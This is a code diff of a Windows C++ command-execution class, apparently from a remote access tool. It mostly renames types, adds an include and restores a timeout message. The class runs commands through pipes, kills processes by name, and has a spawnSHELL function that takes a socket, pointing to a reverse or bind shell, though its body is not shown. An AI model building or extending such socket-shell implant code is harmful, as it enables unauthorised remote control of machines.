@@ -3,7 +3,7 @@
 
 #include "../inc/Exec.h"
 #include "../inc/common.h"
-
+#include "../inc/other.h"
 using namespace std;
 
 Exec::Exec()
@@ -50,7 +50,7 @@ vector<DWORD> Exec::returnPid(wstring stringTargetProcessName)
 }
 
 
-void Exec::setupAllPipe()
+VOID Exec::setupAllPipe()
 {
     
     // Réglez le drapeau bInheritHandle pour que les poignées de pipe soient héritées. 
@@ -148,7 +148,7 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
 
 vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
 {
-    int index=0;
+    INT index=0;
     wstring tmp_for_vector,result_of_command;
 
     DWORD dwRead; 
@@ -187,14 +187,14 @@ vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
     //read stderr
     //cout << "-------------------------------------\n\n" << endl;
 
-    while (true)
+    while(TRUE)
     {
         if(!ReadFile(a_hChildStd_ERR_Rd, chBuff, BUFFER_EXEC,&dwRead,NULL))
         {
             //cout << "stderr: Error in read pipe childen out " << endl;
             break;
         }
-        //int stat = MultiByteToWideChar(CP_UTF8, MB_COMPOSITE, chBuf, strlen(chBuf),wChBuf, wcslen(wChBuf));
+
         string s =  chBuff;
         
         cout << strlen(chBuff) << endl;
@@ -235,7 +235,7 @@ vector<string> Exec::executeCommand(wstring command)
             
             if(!pids.empty()) //if the number of pid found is different from 0 then it means that there are several times the same process
             {
-                for(int i=0;i <pids.size(); i++)
+                for(INT i=0;i <pids.size(); i++)
                 {
                     HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[i]);
                     TerminateProcess(proc, 1);
@@ -243,11 +243,11 @@ vector<string> Exec::executeCommand(wstring command)
                     
                     //cout << "[+] Process: " << pids[i] << " killed" << endl;
                 }
-                //result_of_command.push_back(L"[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (command+".exe") + "we were well and truly killed.");
+                result_of_command.push_back("[-] TIMEOUT IN CREATEPROCESS, but all the processes in the name of: " + (ConvertWideToUtf8(command) + ".exe") + "we were well and truly killed.");
             }
             else
             {
-                //esult_of_command = "[-] TIMEOUT IN CREATEPROCESS, but no process was killed.";
+                //result_of_command = "[-] TIMEOUT IN CREATEPROCESS, but no process was killed.";
                // cout << "No process was killed" << endl;
                 result_of_command = readFromPipe(piProcInfo);
             }
@@ -257,13 +257,12 @@ vector<string> Exec::executeCommand(wstring command)
 
         //Finally return result_of_command
         //cout << "RESULT:  " << result_of_command << endl;
-        cout << "len result command [0]: " << result_of_command[0].length() << endl;
         return result_of_command; 
     }
 }
 
 
-void Exec::spawnSHELL(int sock, wchar_t *prog) //Change to WCHAR
+VOID Exec::spawnSHELL(SOCKET &sock, WCHAR *prog) //Change to WCHAR
 {
 
     STARTUPINFOW siStartInfo;
